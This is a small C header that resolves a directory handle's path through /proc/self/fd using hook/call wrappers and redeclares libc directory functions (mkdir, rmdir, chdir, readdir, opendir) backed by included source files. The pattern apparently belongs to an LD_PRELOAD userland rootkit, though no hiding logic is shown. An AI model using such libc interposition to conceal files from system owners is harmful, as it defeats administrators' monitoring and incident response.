#ifndef DIR_H
#define DIR_H

char *gdirname(DIR *dirp){
    int fd = dirfd(dirp), readlink_status;
    char path[PATH_MAX], *filename = (char *)malloc(sizeof(path));
    memset(filename, 0, PATH_MAX);

    snprintf(path, sizeof(path) - 1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    readlink_status = (long)call(CREADLINK, path, filename, sizeof(path) - 1);
    if(readlink_status < 0) return NULL;
    return filename;
}

int mkdir(const char *pathname, mode_t mode);
#include "mkdir.c"

int rmdir(const char *pathname);
#include "rmdir.c"

int chdir(const char *pathname);
int fchdir(int fd);
#include "chdir.c"

struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
#include "readdir.c"

DIR *opendir(const char *pathname);
DIR *opendir64(const char *pathname);
DIR *fdopendir(int fd);
#include "opendir.c"
#endif
